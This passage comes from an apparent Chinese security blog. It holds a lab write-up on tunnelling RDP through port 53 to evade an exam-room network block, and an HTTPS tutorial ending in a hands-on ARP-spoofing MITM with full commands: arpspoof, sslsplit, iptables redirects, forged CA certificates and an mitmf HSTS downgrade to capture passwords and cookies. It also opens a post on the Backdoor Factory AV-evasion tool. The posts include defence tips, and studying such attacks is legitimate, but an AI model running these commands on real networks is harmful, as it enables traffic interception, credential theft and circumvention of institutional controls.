      <content type="html"><![CDATA[<h2 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h2><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备:"></a><strong>环境准备:</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
<p>[*]这里有monowall的简单<a href="http://www.heminjie.com/network/567.html" target="_blank" rel="external">配置方法</a></p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181026_6raRvt_6724.jpeg" alt=""></p>
<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
<h2 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h2><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
<p>apt-get install rinetd </p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181054_YeYibU_6744.jpeg" alt=""></p>
<h4 id="2-然后，修改-rinetd-的配置文件，指定转发规则"><a href="#2-然后，修改-rinetd-的配置文件，指定转发规则" class="headerlink" title="2. 然后，修改 rinetd 的配置文件，指定转发规则"></a>2. 然后，修改 rinetd 的配置文件，指定转发规则</h4><blockquote>
<p>vim /etc/rinetd.conf</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181106_543GvN_6763.jpeg" alt=""></p>
<h4 id="3-启动rinetd"><a href="#3-启动rinetd" class="headerlink" title="3. 启动rinetd"></a>3. 启动rinetd</h4><blockquote>
<p>rinetd</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
<h4 id="4-启动远程桌面连接xp"><a href="#4-启动远程桌面连接xp" class="headerlink" title="4. 启动远程桌面连接xp"></a>4. 启动远程桌面连接xp</h4><blockquote>
<p>mstsc</p>
</blockquote>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181129_87n6je_6771.jpeg" alt=""></p>
<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181142_MFoUyV_6773.jpeg" alt=""></p>
<h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o"><a href="#emsp-emsp-现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境-o" class="headerlink" title="&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^"></a>&emsp;&emsp;现在我们已经成功突破学校的路由限制控制了外网的XP，不知道这种姿势能否帮助大家更好的理解网络环境\^o^</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[HTTPS攻击]]></title>
      <url>/2017/10/27/HTTPS%E6%94%BB%E5%87%BB/</url>
      <content type="html"><![CDATA[<h2 id="0x00-HTTPS简介"><a href="#0x00-HTTPS简介" class="headerlink" title="0x00. HTTPS简介"></a>0x00. HTTPS简介</h2><h4 id="emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"><a href="#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。" class="headerlink" title="&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"></a>&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</h4><a id="more"></a>
<hr>
<h2 id="0x01-HTTPS原理"><a href="#0x01-HTTPS原理" class="headerlink" title="0x01. HTTPS原理"></a>0x01. HTTPS原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307" alt="image"></p>
<h4 id="1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"><a href="#1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求" class="headerlink" title="1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"></a>1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求</h4><h4 id="2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"><a href="#2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信" class="headerlink" title="2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"></a>2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信</h4><h4 id="3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"><a href="#3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）" class="headerlink" title="3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"></a>3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）</h4><h4 id="4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"><a href="#4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书" class="headerlink" title="4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"></a>4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书</h4><h4 id="【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"><a href="#【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。" class="headerlink" title="【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"></a>【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。</h4><h4 id="5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"><a href="#5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server" class="headerlink" title="5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"></a>5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server</h4><h4 id="6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"><a href="#6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了" class="headerlink" title="6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"></a>6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了</h4><h4 id="7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"><a href="#7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端" class="headerlink" title="7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"></a>7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端</h4><h4 id="【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server"><a href="#【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server" class="headerlink" title="【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server"></a>【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server</h4><h4 id="8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"><a href="#8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data" class="headerlink" title="8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"></a>8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data</h4><h3 id="server发送数据过程类似："><a href="#server发送数据过程类似：" class="headerlink" title="server发送数据过程类似："></a>server发送数据过程类似：</h3><h4 id="【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client"><a href="#【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client" class="headerlink" title="【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client"></a>【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client</h4><hr>
<h2 id="0x02-攻击原理"><a href="#0x02-攻击原理" class="headerlink" title="0x02. 攻击原理"></a>0x02. 攻击原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE78ffc04751b8ecb4bd840b668482b9c8/4502" alt="image"></p>
<h4 id="emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"><a href="#emsp-emsp-1-首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）" class="headerlink" title="&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）"></a>&emsp;&emsp;1. 首先attacker会对目标进行中间人攻击，从而让流量流经自己的电脑（这与burpsuit的原理根本就是一样的）</h4><h4 id="emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"><a href="#emsp-emsp-2-此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信" class="headerlink" title="&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信"></a>&emsp;&emsp;2. 此时client便会与attacker进行https加密通信，server也会与attacker进行https加密通信</h4><h4 id="emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"><a href="#emsp-emsp-3-虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的" class="headerlink" title="&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的"></a>&emsp;&emsp;3. 虽然此时进行的是https通信，但是所有的data对于attacker来说都是明文的</h4><hr>
<h2 id="0x03-攻击实战"><a href="#0x03-攻击实战" class="headerlink" title="0x03. 攻击实战"></a>0x03. 攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-sslsplit、arpspoof"><a href="#emsp-emsp-1-sslsplit、arpspoof" class="headerlink" title="&emsp;&emsp;1. sslsplit、arpspoof"></a>&emsp;&emsp;1. sslsplit、arpspoof</h4><h4 id="emsp-emsp-2-win-7"><a href="#emsp-emsp-2-win-7" class="headerlink" title="&emsp;&emsp;2. win 7"></a>&emsp;&emsp;2. win 7</h4><h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a>实战步骤</h3><h3 id="1-打开kali的数据包转发功能"><a href="#1-打开kali的数据包转发功能" class="headerlink" title="1. 打开kali的数据包转发功能"></a>1. 打开kali的数据包转发功能</h3><blockquote>
<p>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</p>
<h3 id="2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"><a href="#2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）" class="headerlink" title="2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"></a>2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">80</span> -j REDIRECT --to-ports <span class="number">8080</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">443</span> -j REDIRECT --to-ports <span class="number">8443</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">587</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">465</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">993</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">995</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -L</div></pre></td></tr></table></figure>
</blockquote>
<h3 id="3-利用openssl生成私钥"><a href="#3-利用openssl生成私钥" class="headerlink" title="3. 利用openssl生成私钥"></a>3. 利用openssl生成私钥</h3><blockquote>
<p>openssl genrsa -out ca.key 2048</p>
</blockquote>
<h3 id="4-利用私钥签名生成的证书"><a href="#4-利用私钥签名生成的证书" class="headerlink" title="4. 利用私钥签名生成的证书"></a>4. 利用私钥签名生成的证书</h3><blockquote>
<p>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt<br><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/6EB70B114869460E88237A53C65D8E10/4435" alt="image"></p>
</blockquote>
<h3 id="5-启动arpspoof进行中间人攻击"><a href="#5-启动arpspoof进行中间人攻击" class="headerlink" title="5. 启动arpspoof进行中间人攻击"></a>5. 启动arpspoof进行中间人攻击</h3><blockquote>
<p>arpspoof -i eth0 -t 192.168.1.103 -r 192.168.1.1</p>
</blockquote>
<h3 id="6-创建log目录，启动sslsplit"><a href="#6-创建log目录，启动sslsplit" class="headerlink" title="6. 创建log目录，启动sslsplit"></a>6. 创建log目录，启动sslsplit</h3><blockquote>
<p>mkdir -p test/logdir </p>
<p>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/7AD511B11C824B98B4B9555AEDE1443C/4449" alt="image"></p>
<h4 id="如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"><a href="#如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误" class="headerlink" title="[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"></a>[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误</h4><h3 id="7-剩下的就是用正则匹配出想要的账号密码或者cookie了"><a href="#7-剩下的就是用正则匹配出想要的账号密码或者cookie了" class="headerlink" title="7. 剩下的就是用正则匹配出想要的账号密码或者cookie了"></a>7. 剩下的就是用正则匹配出想要的账号密码或者cookie了</h3><h3 id="8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"><a href="#8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文" class="headerlink" title="8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"></a>8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文</h3><blockquote>
<p>iptables -t nat -F</p>
<p>mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.103 <strong>-</strong>-hsts</p>
</blockquote>
<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/73A648CB3A9442459A5DCA6CEAFD64E3/4471" alt="image"></p>
<h4 id="方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"><a href="#方法多种多样，大家还可以尝试其他工具，这里就不一一列举了" class="headerlink" title="[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"></a>[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了</h4><hr>
<h2 id="0x04-防御建议"><a href="#0x04-防御建议" class="headerlink" title="0x04. 防御建议"></a>0x04. 防御建议</h2><h3 id="服务端防御"><a href="#服务端防御" class="headerlink" title="服务端防御"></a>服务端防御</h3><h4 id="emsp-emsp-配置最安全的https"><a href="#emsp-emsp-配置最安全的https" class="headerlink" title="&emsp;&emsp;配置最安全的https"></a>&emsp;&emsp;配置最安全的https</h4><h4 id="emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"><a href="#emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文" class="headerlink" title="&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"></a>&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文</h4><h3 id="客户端防御"><a href="#客户端防御" class="headerlink" title="客户端防御"></a>客户端防御</h3><h4 id="emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗"><a href="#emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗" class="headerlink" title="&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗"></a>&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗</h4><h4 id="emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"><a href="#emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开" class="headerlink" title="&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"></a>&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开</h4><h4 id="emsp-emsp-少去蹭网，往往免费的东西才是最贵的"><a href="#emsp-emsp-少去蹭网，往往免费的东西才是最贵的" class="headerlink" title="&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的"></a>&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的</h4><h4 id="emsp-emsp-珍爱生命，远离黑客"><a href="#emsp-emsp-珍爱生命，远离黑客" class="headerlink" title="&emsp;&emsp;珍爱生命，远离黑客"></a>&emsp;&emsp;珍爱生命，远离黑客</h4><hr>
<h3 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h3><h4 id="emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"><a href="#emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。" class="headerlink" title="&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"></a>&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[The-Backdoor-Factory]]></title>
      <url>/2017/10/13/The-Backdoor-Factory/</url>
      <content type="html"><![CDATA[<h2 id="0x00-BDF简介"><a href="#0x00-BDF简介" class="headerlink" title="0x00. BDF简介"></a>0x00. BDF简介</h2><h4 id="emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"><a href="#emsp-emsp-BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！" class="headerlink" title="&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！"></a>&emsp;&emsp;BDF是一款史诗级免杀神器，在它最巅峰时期遇神杀神、遇佛杀佛，blackhat上也出现过它的身影，虽然由于各大安全厂商越来越重视这款工具，导致它的免杀效果有所下降，不过它仍不失为一款杰出的神器，而且他利用的原理也是那么有创意！</h4><a id="more"></a>
<hr>
<h2 id="0x01-BDF原理"><a href="#0x01-BDF原理" class="headerlink" title="0x01. BDF原理"></a>0x01. BDF原理</h2><h4 id="emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"><a href="#emsp-emsp-笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。" class="headerlink" title="&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在blackhat上的演讲，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。"></a>&emsp;&emsp;笔者也涉猎不多，只能粗略解释一下，大家感兴趣可以看看它的作者在<a href="https://www.youtube.com/watch?v=OuyLzkG16Uk" target="_blank" rel="external">blackhat上的演讲</a>，上面介绍了BDF的原理还讲解了BDFproxy的用法，因为kali环境老是出问题，所以这里就不介绍BDFproxy了。</h4><p><img src="http://note.youdao.com/yws/public/resource/44c0d2be5b051cd98c06499e64839377/xmlnote/9D4C649B65E74C2BBC85888D12100693/3084" alt="image"></p>
